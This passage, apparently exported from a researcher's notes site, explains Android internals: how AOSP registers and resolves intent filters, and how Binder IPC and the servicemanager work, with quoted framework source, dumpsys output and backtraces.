intents (through the `\u003cintent-filter\u003e` declaration) and these intents are ***magically*** delivered to it from other applications, without the knowledge of the final destination package. Since magic can be hypothetically just defined as a form of ignorance (*at least* in computer science?), let’s see where the “magic” happens in the Android source code!\n\n## Intent registration\n### Starting from the beginning\nLet's start from an application point of view that needs to handle specific actions: an `\u003cintent-filter\u003e` is declared inside the `AndroidManifest.xml`:\n```xml\n\u003ccomponent android:name\u003e\n\t\u003cintent-filter\u003e\n\t\t\u003caction android:name=\"android.intent.action.VIEW\"\u003e\n\t\t\u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n\t\t\u003cdata android:scheme=\"scheme\"/\u003e\n\t\u003c/intent-filter\u003e\n\u003c/component\u003e\n```\nIn this example, the `component` can be of any type: an `activity`, `receiver`, `service` or `provider`. Some filters are also specified in order to discriminate matching events that the component is interested into: `action`, `category` and `data` (with the `android:scheme` attribute) are specifically used in this case (check out the [\\\u003cintent-filter\\\u003e documentation](https://developer.android.com/guide/topics/manifest/intent-filter-element) for more filters and options).\nAt install time, the [`PackageInstaller`](https://developer.android.com/reference/android/content/pm/PackageInstaller) service is responsible to install the application and all its components, including intent filters. More specifically, diving into the AOSP (Android Open Source Project) codebase, it is possible to identify some key functions that parse all declared components. More specifically, the [`ComponentResolver::addAllComponents`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/pm/resolution/ComponentResolver.java;drc=4bf59a583eefeb8b27a79fbd1fc5093ddb79d747;l=191) method calls four methods that parse all components' details.\n\n```java \n    public void addAllComponents(/*..*/){\n        /*..*/\n        synchronized (mLock) {\n            addActivitiesLocked(computer, pkg, newIntents, chatty);\n            addReceiversLocked(computer, pkg, chatty);\n            addProvidersLocked(computer, pkg, chatty);\n            addServicesLocked(computer, pkg, chatty);\n            onChanged();\n        }\n        /*..*/\n```\n\nFollowing the `Add[Component]Locked` logic, components are registered based on their type on specific variables (e.g. `mActivities`, `mProviders`, `mReceivers` and `mServices`) and then intent filters are parsed. Let's take the activity parsing as an example to reference some code, but the concept is the same across all different components. `addActivitiesLocked` calls [`mActivities.addActivity`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/pm/resolution/ComponentResolver.java;l=282) (part of the `ComponentResolver` class) that calls `addFilter` for each declared intent filter.\n\n```java\n\t// code cutted for demonstration purposes\n\tprotected void addActivity(@NonNull Computer computer, ParsedActivity a, String type,\n\t\t\tList\u003cPair\u003cParsedActivity, ParsedIntentInfo\u003e\u003e newIntents) {\n\t\tfinal int intentsSize = a.getIntents().size();\n\t\tfor (int j = 0; j \u003c intentsSize; j++) {\n\t\t\tParsedIntentInfo intent = a.getIntents().get(j);\n\t\t\tIntentFilter intentFilter = intent.getIntentFilter();\n\t\t\tif (newIntents != null \u0026\u0026 \"activity\".equals(type)) {\n\t\t\t\tnewIntents.add(Pair.create(a, intent));\n\t\t\t}\n\t\t\t/* .. */\n\t\t\taddFilter(computer, Pair.create(a, intent));\n\t\t}\n\t}\n```\n\nIntents are cycled within a for loop and each declared intent filter is passed as an argument to [`ComponentResolver::MimeGroupsAwareIntentResolver::addFilter`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/pm/resolution/ComponentResolver.java;l=834) that finally calls [`IntentResolver::addFilter`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=58) where most of the registering process happens. Before diving into the logic of this specific method, it is important to discriminate intent filters as they are internally classified: `Full MIME Types`, `Base MIME Types`, `Wild MIME Types`, `Schemes`, `Non-data Actions`, `MIME Typed Actions`.\n### The \"obscure\", less-known, internal classification\nThe \"obscure\" adjective is a clearly amplification of the concept, but there is an interesting internal intent classification (that influences the consecutive resolution process) that is not explicitly documented in the Android Documentation (that is, for most parts, really complete) and it was possible to identify it by wandering in the codebase, more specifically into the [`IntentResolver::dump`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=286) method reachable from the `dumpsys` utility (more on that later). These categories are not really difficult to understand and they are particularly influenced by the specified MIME type that can be explicitly defined in the `\u003cintent-filter\u003e` declaration using the [`mimeType`](https://developer.android.com/guide/topics/manifest/data-element#mime) attribute inside the [`\u003cdata\u003e`](https://developer.android.com/guide/topics/manifest/data-element) tag . The MIME type standard is widely used across technologies in order to identify resource types (e.g. `image/png`, `text/html`, ..) and consists of two main parts that we are interested into:\n- **Type**: the generic type of the the format, for example `image`, `application`, `audio`, `video` and so on.\n- **Subtype**: the subtype is more specific and contains the media format. For example `png`, `html` and `mp4` are an example of possible subtypes. \n\nWith this knowledge, we can go through all categories:\n- `Full MIME Types`: inside this category we have all possible MIME Types independently of its two parts (e.g. `image/png` and `image/*`).\n- `Base MIME Types`: the base classification is related to data types that fully contains the two parts (e.g. `image/png` or `video/mp4`).\n- `Wild MIME Types`: MIME Types without the \"subtype\" (e.g. `image` or `video`) or with a mask (e.g. `image/*` or `video/*`).\n- `Schemes`: intent filters that handles data schemes (e.g. `\u003cdata android:scheme=\"scheme\"/\u003e`).\n- `Non-data Actions`: Intent filters that do not contain any MIME type and data scheme.\n- `MIME Typed Actions`: Intent filters that contains at least one MIME type.\n\nAs can be seen, an intent filter can also fall inside different categories. For example, an intent filter declared with a `mimeType` of value `image` is classified inside the `Full MIME Type` (as it contains a MIME type), `Wild Mime Type`  (as it contains only the first part of the MIME type) and `MIME Typed Action` since it contains at least one MIME type.\n\n### Registering methods\nAfter this needed digression on the internal classification, let's jump back to the [`IntentResolver::addFilter`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=58):\n\n```java\n// simplified code\npublic void addFilter(@Nullable PackageDataSnapshot snapshot, F f) {\n\t/* .. */*\n\tmFilters.add(f);\n\tint numS = register_intent_filter(f, intentFilter.schemesIterator(),\n\t\t\tmSchemeToFilter, \"      Scheme: \");\n\tint numT = register_mime_types(f, \"      Type: \");\n\tif (numS == 0 \u0026\u0026 numT == 0) {\n\t\tregister_intent_filter(f, intentFilter.actionsIterator(),\n\t\t\t\tmActionToFilter, \"      Action: \");\n\t}\n\tif (numT != 0) {\n\t\tregister_intent_filter(f, intentFilter.actionsIterator(),\n\t\t\t\tmTypedActionToFilter, \"      TypedAction: \");\n\t}\n}\n\nprivate final int register_mime_types(F filter, String prefix) {\n\tfinal Iterator\u003cString\u003e i = getIntentFilter(filter).typesIterator();\n\t/* .. */\n\tint num = 0;\n\twhile (i.hasNext()) {\n\t\tString name = i.next();\n\t\tnum++;\n\t\tString baseName = name;\n\t\tfinal int slashpos = name.indexOf('/');\n\t\tif (slashpos \u003e 0) {\n\t\t\tbaseName = name.substring(0, slashpos).intern();\n\t\t} else {\n\t\t\tname = name + \"/*\";\n\t\t}\n\n\t\taddFilter(mTypeToFilter, name, filter);\n\n\t\tif (slashpos \u003e 0) {\n\t\t\taddFilter(mBaseTypeToFilter, baseName, filter);\n\t\t} else {\n\t\t\taddFilter(mWildTypeToFilter, baseName, filter);\n\t\t}\n\t}\n\treturn num;\n}\n```\n\nThis method is responsible to register three main categories through its code using the [`IntentResolver::register_intent_filter`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=640) method: `Schemes`, `Non-Data actions` and `Typed`, while other MIME-related categories are registered through [`IntentResolver::register_mime_types`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=579). As can be observed from the code, filters are registered following the previously described classification and results are stored inside the following class members (defined inside [`IntentResolver.java`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=871)): `mSchemeToFilter`, `mActionToFilter`, `mTypedActionToFilter`, `mTypedActionToFilter`, `mBaseTypeToFilter` and `mWildTypeToFilter`. These members are later used for the resolution process.\n## Intent resolution\nWe have seen the logic behind the registration process of intent filters and now we are in the hearth of the topic: the resolution process.\nThe resolution process, and related system services and APIs, particularly depends on the targeted components (activities, receivers, services or providers) but in order to circumscribe the logic, let's take into account two common APIs: `startActivity` and `sendBroadcast`. They can both send intents and, more importantly, **implicit** intents. \n### startActivity\nLet's start our journey with the `startActivity` API, using a simple code as a reference:\n```java\nIntent in = new Intent(\"com.example.non_existent.ACTION\", Uri.parse(\"13371337\"););\nstartActivity(in);\n```\n\nFrom the imported library code (e.g. inside the sender application process) after some preliminary error checking, the `startActivity` method from the `ActivityTaskManager` system service is called. This service method is responsible to find and start the destination activity if matched and it is part of the `system_server` services. In order to find target destinations that match a specific intent action (if not explicitly set from the sender), the previously described attributes (`mSchemeToFilter`, `mActionToFilter`, ..) are consulted from an internal method: [`IntentResolver::queryIntent`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=382). \n#### IntentResolver::queryIntent\nThis method is reached after multiple calls (see the [[#Backtrace startActivity]] backtrace for all involved methods) and is responsible to loop over mentioned attributes in order to find most suitable destinations. The returned result is a list of candidates (`List\u003cR\u003e`).\nThe objective is not as easy to implement: a requested intent can have multiple candidates of any type (matching the MIME type, scheme and data) but need to return results that include everything!\n```java\nprotected final List\u003cR\u003e queryIntent(@NonNull PackageDataSnapshot snapshot, Intent intent,\n\t\tString resolvedType, boolean defaultOnly, @UserIdInt int userId, long customFlags) {\n\tString scheme = intent.getScheme();\n\tArrayList\u003cR\u003e finalList = new ArrayList\u003cR\u003e();\n\t/* .. */\n\n\tF[] firstTypeCut = null;\n\tF[] secondTypeCut = null;\n\tF[] thirdTypeCut = null;\n\tF[] schemeCut = null;\n\n\t// If the intent includes a MIME type, then we want to collect all of\n\t// the filters that match that MIME type.\n\tif (resolvedType != null) { // [1]\n\t\tint slashpos = resolvedType.indexOf('/');\n\t\tif (slashpos \u003e 0) {\n\t\t\tfinal String baseType = resolvedType.substring(0, slashpos);\n\t\t\tif (!baseType.equals(\"*\")) {\n\t\t\t\tif (resolvedType.length() != slashpos+2\n\t\t\t\t\t\t|| resolvedType.charAt(slashpos+1) != '*') {\n\t\t\t\t\tfirstTypeCut = mTypeToFilter.get(resolvedType); // [2]\n\t\t\t\t\tsecondTypeCut = mWildTypeToFilter.get(baseType); // [4]\n\t\t\t\t} else {\n\t\t\t\t\t// We can match anything with our base type.\n\t\t\t\t\tfirstTypeCut = mBaseTypeToFilter.get(baseType); // [3]\n\t\t\t\t\tsecondTypeCut = mWildTypeToFilter.get(baseType); // [4]\n\t\t\t\t}\n\t\t\t\tthirdTypeCut = mWildTypeToFilter.get(\"*\");\n\t\t\t} else if (intent.getAction() != null) {\n\t\t\t\t// The intent specified any type ({@literal *}/*).  This\n\t\t\t\t// can be a whole heck of a lot of things, so as a first\n\t\t\t\t// cut let's use the action instead.\n\t\t\t\tfirstTypeCut = mTypedActionToFilter.get(intent.getAction()); // [5]\n\t\t\t}\n\t\t}\n\t}\n\n\tif (scheme != null) {\n\t\tschemeCut = mSchemeToFilter.get(scheme); // [6]\n\t}\n\n\tif (resolvedType == null \u0026\u0026 scheme == null \u0026\u0026 intent.getAction() != null) {\n\t\tfirstTypeCut = mActionToFilter.get(intent.getAction()); // [7]\n\t}\n\n\tFastImmutableArraySet\u003cString\u003e categories = getFastIntentCategories(intent);\n\tComputer computer = (Computer) snapshot;\n\tif (firstTypeCut != null) {\n\t\tbuildResolveList(computer, intent, categories, debug, defaultOnly, resolvedType,\n\t\t\t\tscheme, firstTypeCut, finalList, userId, customFlags);\n\t}\n\tif (secondTypeCut != null) {\n\t\tbuildResolveList(computer, intent, categories, debug, defaultOnly, resolvedType,\n\t\t\t\tscheme, secondTypeCut, finalList, userId, customFlags);\n\t}\n\tif (thirdTypeCut != null) {\n\t\tbuildResolveList(computer, intent, categories, debug, defaultOnly, resolvedType,\n\t\t\t\tscheme, thirdTypeCut, finalList, userId, customFlags);\n\t}\n\tif (schemeCut != null) {\n\t\tbuildResolveList(computer, intent, categories, debug, defaultOnly, resolvedType,\n\t\t\t\tscheme, schemeCut, finalList, userId, customFlags);\n\t}\n\tfilterResults(finalList);\n\tsortResults(finalList);\n\n\t/* .. */\n\treturn finalList;\n}\n```\n\nThe `queryIntent` function satisfy this logic by using multiple \"cuts\". It starts from the first cut that is related to MIME types[1]: if the intent matches some MIME type, the matching candidates are extracted from `Full MIME Types` [2], `Base MIME Types` [3] and `Wild Mime Types` [4] relative members. An interesting behavior is for the `Typed Action` filters[5]: If the primary part of the MIME type is `*` (e.g. `*/*`) then, since the target can be anything and is too much generic, the action is used as a discrimination.\nThen, if the `scheme` is specified, `schemes` candidate filters are retrieved [6] and the same (if the `scheme` is null) for the `Non-data actions`[7]. Every cut candidates are then confirmed from the `buildResolveList` to match all requested intent characteristics with the [`intentFilter.match(..)`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=773) call\nand the final list is returned in the `finalList` variable.\n\n### sendBroadcast\nThe `senBroadcast` resolution logic is really similar to the `startActivity` function with a major difference: the requested method and service.\n```java\nIntent in = new Intent(\"com.example.non_existent.ACTION\", Uri.parse(\"13371337\"););\nsendBroadcast(in);\n```\n\nThe involved service is the `ActivityManager` with the `broadcastIntentWithFeature` service method. As can be seen from the stack trace at the bottom ([[#Backtrace sendBroadcast]]) the `IntentResolver::queryIntent` method is called from the `ComponentResolver` class and the logic is the same one describer earlier.\n### System Services and other methods\nWe have treated two common methods but there are multiple entry points to resolve intents for different types of components, however the logic is always the same: registered intents are cycled through the `IntentResolver::queryIntent` method. For example, the `queryIntentActivities` method is another commonly used method, exposed from the `PackageManager` system service, to resolve intents. AIDLs (Android Interface Definition Language) for the described services can be consulted there for more exposed functionalities: [`IActivityTaskManager.aidl`](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/app/IActivityTaskManager.aidl;l=95;bpv=0;bpt=0?q=IActivityTaskManager\u0026ss=android/platform/superproject/main), [`IActivityManager.aidl`](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/app/IActivityManager.aidl;l=1;bpv=0;bpt=0?q=android.app.IActivityManager\u0026sq=\u0026ss=android/platform/superproject/main) and [`PackageManager.aidl`](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/content/pm/IPackageManager.aidl;l=1;bpv=0;bpt=0?q=IPackageManager.aidl%20\u0026ss=android/platform/superproject/main)\n## dumpsys\nThe `dumpsys` utility is extremely helpful to list all registered intent filters in the system through the `package` argument. It offers the internal classification structure as output and the dump logic can be found from the previously mentioned [`IntentResolver::dump`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=286) method. The output contains the \"Resolver Table\" for each component type (activity, receiver, service and provider) with the described internal classification (`Full MIME Types`, `Non-data actions`, ..). For example, the `adb shell dumpsys package` returns a similar output:\n```bash\n$ adb shell dumpsys package\n# ...\nActivity Resolver Table:\n  Full MIME Types:\n      application/pkix-cert:\n        9f5fd74 com.android.certinstaller/.CertInstallerMain\n      x-mixmedia/*:\n        6f2b72d com.google.android.bluetooth/com.android.bluetooth.opp.BluetoothOppLauncherActivity\n      vnd.android.cursor.dir/raw_contact:\n        58bbd45 com.google.android.contacts/com.android.contacts.activities.PeopleActivity\n        ac07323 com.google.android.contacts/com.android.contacts.activities.CompactContactEditorActivity\n        d430587 com.google.android.contacts/com.google.android.apps.contacts.editorlite.ContactsEditorlite\n      application/vnd.google-apps.map:\n        169295e com.google.android.apps.docs/.app.OpenSafUrlActivity\n# ....\n```\n\nIt is possible to add the `-f` option to print details for all specific filters such as declared actions, categories and data. In order to limit the output to a specific app, the application name can be specified: `adb shell dumpsys package com.target.app`.\n```bash\n$ adb shell dumpsys package com.target.pp\n# ...\n  MIME Typed Actions:\n      android.intent.action.VIEW:\n        9f5fd74 com.android.certinstaller/.CertInstallerMain filter fa0d312\n          Action: \"android.intent.action.VIEW\"\n          Category: \"android.intent.category.DEFAULT\"\n          StaticType: \"application/x-x509-ca-cert\"\n          StaticType: \"application/x-x509-user-cert\"\n          StaticType: \"application/x-x509-server-cert\"\n          StaticType: \"application/x-pkcs12\"\n          StaticType: \"application/x-pem-file\"\n          StaticType: \"application/pkix-cert\"\n          StaticType: \"application/x-wifi-config\"\n# ...\n```\n\n## Backtraces\n### Backtrace: startActivity\n```java\nat com.android.server.IntentResolver.queryIntent(Native Method)\nat com.android.server.pm.resolution.ComponentResolver$ActivityIntentResolver.queryIntent(ComponentResolver.java:985)\nat com.android.server.pm.resolution.ComponentResolverBase.queryActivities(ComponentResolverBase.java:130)\nat com.android.server.pm.ComputerEngine.queryIntentActivitiesInternalBody(ComputerEngine.java:756)\nat com.android.server.pm.ComputerEngine.queryIntentActivitiesInternal(ComputerEngine.java:584)\nat com.android.server.pm.ResolveIntentHelper.resolveIntentInternal(ResolveIntentHelper.java:190)\nat com.android.server.pm.PackageManagerInternalBase.resolveIntentExported(PackageManagerInternalBase.java:476)\nat com.android.server.wm.ActivityTaskSupervisor.resolveIntent(ActivityTaskSupervisor.java:766)\nat com.android.server.wm.ActivityStarter$Request.resolveActivity(ActivityStarter.java:568)\nat com.android.server.wm.ActivityStarter.execute(ActivityStarter.java:707)\nat com.android.server.wm.ActivityTaskManagerService.startActivityAsUser(ActivityTaskManagerService.java:1288)\nat com.android.server.wm.ActivityTaskManagerService.startActivityAsUser(ActivityTaskManagerService.java:1239)\nat com.android.server.wm.ActivityTaskManagerService.startActivity(ActivityTaskManagerService.java:1214)\nat android.app.IActivityTaskManager$Stub.onTransact(IActivityTaskManager.java:929)\nat com.android.server.wm.ActivityTaskManagerService.onTransact(ActivityTaskManagerService.java:5511)\nat android.os.Binder.execTransactInternal(Binder.java:1339)\nat android.os.Binder.execTransact(Binder.java:1275)\n```\n### Backtrace: sendBroadcast\n```java\nat com.android.server.IntentResolver.queryIntent(Native Method)\nat com.android.server.pm.resolution.ComponentResolver$ActivityIntentResolver.queryIntent(ComponentResolver.java:985)\nat com.android.server.pm.resolution.ComponentResolverBase.queryActivities(ComponentResolverBase.java:130)\nat com.android.server.pm.ComputerEngine.queryIntentActivitiesInternalBody(ComputerEngine.java:756)\nat com.android.server.pm.ComputerEngine.queryIntentActivitiesInternal(ComputerEngine.java:584)\nat com.android.server.pm.ComputerEngine.queryIntentActivitiesInternal(ComputerEngine.java:628)\nat com.android.server.pm.IPackageManagerBase.queryIntentActivities(IPackageManagerBase.java:1000)\nat android.content.pm.IPackageManager$Stub.onTransact(IPackageManager.java:2275)\nat com.android.server.pm.PackageManagerService$IPackageManagerImpl.onTransact(PackageManagerService.java:6334)\nat android.os.Binder.execTransactInternal(Binder.java:1339)\nat android.os.Binder.execTransact(Binder.java:1275)\n```\n\n## Conclusion\nWe have covered the internal intent resolution process that deals with the `\u003cintent-filter\u003e` package declaration, going through involved system services and the internal AOSP codebase. In the next blog post we will cover Deep and App linking in more details due to its strict relation with the the intent declaration and its interesting attack surface.\n\n## References\n- https://cs.android.com/\n- https://developer.android.com/","lastmodified":"2025-04-14T13:32:05.60308601Z","tags":null},"/notes/Android-Internals-IPC-Binder-and-Service-Manager-Perspective":{"title":"Android Internals IPC: Binder and Service Manager Perspective","content":"\n## Introduction\nAs mentioned in the previous article, Android uses the Binder for IPC communications. Good to know, the Binder was not created by Google. Its initial appearance was in BeOS, an old OS for mobile devices. After some acquisitions, original developers joined Android and took the Binder with them. The OpenBinder porting to Android was more implementation specific and it is a key component of the current Android OS. The official OpenBinder website is not up anymore, but there are some mirrors like [this one](http://www.angryredplanet.com/~hackbod/openbinder/docs/html/) that contain precious documentation. \n\n## High level overview\nBinder is a kernel module written in C, mainly responsible to let processes securely, transparently and easily communicate with each other using a client-server architecture. The simplicity on how processes can interact together is awful, a client application just needs to call a method provided by the service (that is the server in the client-side architecture) and everything in between is handled by the Binder. With ‘everything in between’ I mean **location**, **delivery** and **credentials**.\n\nWhen a client needs to interact with a service, he needs to locate the target service (that is, in fact, the target process). The binder is responsible to locate the service, handle the communication, deliver the messages and check for caller privileges (credentials).**The location stage is handled by the servicemanager** that acts as the endpoint mapper, it maintains a service directory that maps an interface name to a Binder handle. So, when the Binder receives a request for a specific service, it asks to the servicemanager. The servicemanager returns a handle to the binder after some permission checks (for example the` AID_ISOLATED` mentioned in the first part) scrolling on its service list (aka service directory). If the client has permissions to interact with the requested service, the Binder will proxy the communication and deliver the message to the server, that will elaborate the request and return the result to the Binder, that will redirect it to the client as a \"message\". These messages are technically called \"Parcels\", containers that are written from both client and server in order to communicate with a serialization mechanism (parameters, return values, ..).\n\n![img1](/notes/images/android/2/1.png)\n\n## Binder Introduction\n\nLet's start with the main component of an IPC transaction, the Binder. As we said, the Binder is a small kernel module that lives in the kernel and acts as a messenger for clients and services. Every operation in Android goes through the Binder, and that's why two researchers, Nitay Artenstein and Idam Revivo, took an interesting talk at BH2014: [Man in the Binder: He Who Controls IPC, Controls the Droid](https://www.youtube.com/watch?v=O-UHvFjxwZ8\u0026t=418s).\n\nThis research demonstrates an advanced post exploitation technique (a rootkit implant) where it is possible to sniff every data that uses IPC, in order to manipulate network traffic and sensitive information by hooking binder calls.\n\nThe character device at `/dev/binder` is read/write by everyone, any process can perform read and write operations on it using `ioctl()` calls. The `ioctl()` responsible to handle the IPC connection from clients (applications) is located in the *'libbinder.so'* shared library, that is loaded in each application process. This library is responsible for the client initialization phase, setting up messages (aka Parcel) and talking with the binder driver. We will deepen this specific library while talking, in next chapters, about the client and service implementations.\n\n## Binder interactions (userland -\u003e kerneland)\n\nFirst to introduce more concepts, let's first take an introduction on how a basic interaction works from userland to kerneland, from a client (or a service) to the binder kernel module. As a linux based OS, the `ioctl` system call is used to talk with the kernel module using the special character file `/dev/binder`. The driver accepts different request codes:\n- `BINDER_SET_MAX_THREAD`: Limit thread numbers of a thread pool.\n- `BINDER_SET_CONTEXT_MGR`: Set the context manager (the service manager).\n- `BINDER_THREAD_EXIT`: A thread exit the thread pool.\n- `BINDER_VERSION`: Get the Binder version.\n- `BINDER_WRITE_READ`: The most executed request code responsible for all client and service requests.\n\nWe will deepen all commands during these articles, but let's start with the `BINDER_WRITE_READ` request code.The binder module source code is at `drivers/android/binder.c`, here the `binder_ioctl()` is responsible to dispatch requests received from userland based on above request codes. In the case of a `BINDER_WRITE_READ` code, the `binder_ioctl_write_read()` is triggered and parameters are handled from userland to kerneland (and vice versa) using the `binder_write_read` structure:\n\n```CPP\nstruct binder_write_read {\n\tsigned long write_size;  // size of buffer by the client\n\tsigned long write_consumed;  // size of buffer by the binder\n\tunsigned long   write_buffer;\n\tsigned long read_size;  // size of buffer by the client\n\tsigned long read_consumed;  // size of buffer by the binder\n\tunsigned long   read_buffer;\n};\n```\n\nIn this structure, we have 2 main divisions: **write and read items**. Write items (`write_size`, `write_consumed`, `write_buffer`) are used to send commands to the binder that it has to execute, meanwhile read items contain transactions from the binder to the clients that they have to execute (the ones that `ioctl` the binder).\n\nFor example, if a client needs to talk to a service, it will send a `binder_write_read` command with write items filled. When binder replies back, the client will have read items filled back. The same, a service waiting for client interactions, will receive transactions from the binder with read items.\n\nWhile talking about \"clients\", I don’t mean only application clients that need to perform a request in an IPC context. A client, in this context, is a process that `ioctl()` the binder. For example, a service waiting for transactions from an application is a client of the binder, because it calls `ioctl()` in order to receive actions.\n\n![img2](/notes/images/android/2/2.png)\n\nNote that in the case of a client, the `ioctl` is performed when it is needed from the application (for example to perform an Inter Process Communication). Meanwhile, the service process has threads waiting in a loop for transactions from the binder.\n\nInside these read and write attributes we have more commands, that starts with `BC_` and `BR_`. The difference is in the way that the transaction is going, to or from the Binder. **`BR`** are commands **received FROM the binder**, while **BC** are commands **SENT to the binder**. To remind me about this difference, I think of them as they are \"**B**inder**C**all\" (BC) and \"**B**inder**R**eceive\" (BR), but I don't think they are the official acronyms.\n\nAn example of a generic command that applies to both types of interactions is \"TRANSACTION\". we can have `BC_TRANSACTION` and `BR_TRANSACTION`. `BC_TRANSACTION` is used from clients to binder, while `BR_TRANSACTION` is used from the binder to its clients.\n\n### The servicemanager\nAs was illustrated in the High Level overview, the servicemanager is responsible for the **location stage**. When a client needs to interact with a service (using the Binder), the Binder will ask the servicemanager for a handle to that service.\n\nThe servicemanager source code is located at `frameworks/native/cmds/servicemanager/`, where `service_manager.c` is responsible to initialize itself and handle service related requests. Meanwhile, in `binder.c` (inside that path, not the kernel module) we find the code responsible to handle the communication with the binder, parsing received requests from it and sending the appropriate replies. \n\nServicemanager is started at boot time as defined in `/init.rc` file. This init file is part of the boot image and is responsible to load system partitions and binaries in the boot process:\n\n```javascript\n    /.../\n    # start essential services\n    start logd\n    start servicemanager\n    start hwservicemanager\n    start vndservicemanager\n    /.../\n\n  # When servicemanager goes down, restart all specified services\n    service servicemanager /system/bin/servicemanager\n    class core\n    user system\n    group system\n    critical\n    onrestart restart healthd\n    onrestart restart zygote\n    onrestart restart media\n    onrestart restart surfaceflinger\n    onrestart restart drm\n    onrestart restart perfhub\n    /.../\n```\n\nWhen the service manager is started, the `main` function obtains a handle to the binder (`/dev/binder`) and successively call `binder_become_context_manager()` that will `ioctl` the binder with the `BINDER_SET_CONTEXT_MGR` command, in order to declare itself as the context manager.\n\nThe **context manager** is crucial for the binder as it serves as the service locator. When the binder needs to locate a service, it asks for a handle to its context manager .Once the registration with the binder it's done, it calls `binder_loop` (from `binder.c`) with a callback function parameter. This callback (`svcmgr_handler`) will be responsible to handle service related requests.\n\nThe `binder_loop` responsibility, as the name suggests, is to start an infinite loop that will receive requests from the binder. Before this loop, it will call the binder with `BC_ENTER_LOOPER` to inform the binder that a specific thread is joining the thread pool. The **thread pool** is a group of threads that are waiting for incoming messages from the binder, usually services have multiple threads in order to handle multiple requests. By the way, the service manager is a single-threaded service, so this is the first and unique thread. \n\nAfter this notification, the servicemanager starts its infinite loop that continuously calls the binder through `ioctl` waiting for actions. This is managed using the `BINDER_WRITE_READ` command (to the binder) with a `binder_write_read` structure that will be filled by the binder in its `read_*` items, this is the already mentioned structure:\n\n```cpp\nstruct binder_write_read {\n\tsigned long write_size;  // size of buffer by the client\n\tsigned long write_consumed;  // size of buffer by the binder\n\tunsigned long   write_buffer;\n\tsigned long read_size;  // size of buffer by the client\n\tsigned long read_consumed;  // size of buffer by the binder\n\tunsigned long   read_buffer;\n};\n```\n\nWhen the binder needs the service manager to perform an action (e.g. getting a handle to a service) it will return to the `binder_loop()` a `binder_write_read` structure with `read_buffer` filled with the requested transaction (and in `read_consumed` its actual size). These two values are passed over the `binder_parse` function that starts to deserialize the transaction request:\n\n```cpp\n  /* .. */\n\tuintptr_t end = ptr + (uintptr_t) size; // end calculated using the bwr.read_consumed\n\twhile (ptr \u003c end) {\n\t\tuint32_t cmd = *(uint32_t *) ptr; // the command is read from the buffer\n\t\tptr += sizeof(uint32_t);\n\t// switch case on the received command\n\tswitch(cmd) {\n\t\tcase BR_NOOP:\n\t\t\tbreak;\n\t/* .. */\n```\n\nThe first 32 bits of the `bwr.read_buffer` contains the command to be executed (`cmd`). There is a huge list of handled commands: `BR_NOOP`, `BR_TRANSACTION_COMPLETE`, `BR_INCREFS` - `BR_ACQUIRE` - `BR_RELEASE`, `BR_DECREFS`, `BR_DEAD_BINDER`, `BR_FAILED_REPLY` - `BR_DEAD_REPLY`, `BR_TRANSACTION`, `BR_REPLY`.\n\nYou can find a lot more `BR_*` commands, but these are the only ones handled by the servicemanager. For example, a normal service can receive a `SPAWN_LOOPER` command from the binder, that requests the service to spawn a new thread in order to handle more requests. We said that the servicemanager is single thread, so there is no sense to receive this type of requests, so they are not handled. We will better deepen on these commands that are used by other services in `IPCThreadState.cpp` in next articles.\n\nAfter having extracted the command from the `binder_read_write` structure, this one is inserted in a switch case where above commands are managed. The most interesting one is the `BR_TRANSACTION` because it means that the binder needs to retrieve a service handle or register a new service.\n\n### BR_TRANSACTION\nFollowing the service manager source code we can encounter and deepen some essentials structures such as the `binder_transaction_data` that is casted from `bwr.read_buffer` (now referenced in the local function as `ptr`) + `sizeof(uint32_t)`, because the first 32 bits are meant for the command constant.\n\n```cpp \nstruct binder_transaction_data *txn = (struct binder_transaction_data *) ptr;\n```\n\n![img3](/notes/images/android/2/3.png)\n\nThis is the `binder_transaction_data` structure:\n\n```cpp\n\n//https://android.googlesource.com/kernel/msm/+/android-6.0.1_r0.74/drivers/staging/android/uapi/binder.h\nstruct binder_transaction_data {\n  /* The first two are only used for bcTRANSACTION and brTRANSACTION,\n   * identifying the target and contents of the transaction.\n   */\n  union {\n    __u32 handle; /* target descriptor of command transaction */\n    binder_uintptr_t ptr; /* target descriptor of return transaction */\n                // in BR_TRANSACTION this must be BINDER_SERVICE_MANAGER or the service_manager return -1\n  } target;\n  binder_uintptr_t  cookie; /* target object cookie */\n  __u32   code;   /* transaction command. */ // e.g. SVC_MGR_GET_SERVICE\n  /* General information about the transaction. */\n  __u32         flags;\n  pid_t   sender_pid;\n  uid_t   sender_euid;\n  binder_size_t data_size;  /* number of bytes of data */\n  binder_size_t offsets_size; /* number of bytes of offsets */\n  /* If this transaction is inline, the data immediately\n   * follows here; otherwise, it ends with a pointer to\n   * the data buffer.\n   */\n  union {\n    struct {\n      /* transaction data */\n      binder_uintptr_t  buffer;\n      /* offsets from buffer to flat_binder_object structs */\n      binder_uintptr_t  offsets;\n    } ptr;\n    __u8  buf[8];\n  } data;\n};\n\n```\n\nThis structure contains necessary information about the incoming request, such as the sender `PID` and `UID` to check permissions for a service, the target descriptor (`handle`) and the transaction command (`code`) for the service manager (for example 